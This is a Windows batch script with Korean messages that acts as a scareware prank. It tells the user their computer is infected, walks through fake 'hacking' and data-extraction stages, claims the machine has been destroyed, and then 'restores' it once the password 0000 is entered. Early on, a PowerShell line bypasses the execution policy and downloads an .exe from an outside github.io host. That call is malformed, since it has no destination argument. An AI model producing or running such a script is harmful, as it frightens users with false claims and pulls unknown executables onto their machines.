@echo off
chcp 949
cls
echo 당신의 컴퓨터는 치명적인 악성코드에 감염되었습니다.
powershell.exe -ExecutionPolicy ByPass -WindowStyle Normal (New-Object System.Net.WebClient).DownloadFile('https://chonggi-tokhu.github.io/aass/docs/pages/windows123.exe');
color 0f
echo 1단계 해킹중...
timeout 2
color 1f
echo 2단계 해킹중...
timeout 2
color 2f
echo 3단계 해킹중...
timeout 2
color 3f
echo 개인정보를 추출하는중...
timeout 2
color 9f
echo 4단계 해킹중...
timeout 2
color Df
echo 5단계 해킹중...
timeout 4
echo 컴퓨터를 고장내는중...
timeout 2
color 4f
echo 파괴가 끝났습니다. 이제 이 컴퓨터를 고물상에 파셔도 괜찮습니다.
timeout 6

echo 희망고문인 동시에 팩트입니다.
echo 당신이 컴퓨터를 고칠수 있는 마지막 기회입니다. 
echo 다음 창에 비번을 입력하세요 비번은 0000입니다
set /p password=
if %password%==0000(
goto case2
) else (
goto case1
)
:case1
cls
echo 비번이 틀렸으니 이따가 컴퓨터는 고물상에 갖다 파세요
echo 에이씨 당신의 보안프로그램덕분에 해킹이 실패했어요 책임지세요
start C:\Windows\explorer.exe
pause

:case2
cls
echo 아 비번 맞다 실패!!! 아까비 님의 컴퓨터가 정상화되었네요
start C:\Windows\explorer.exe
pause
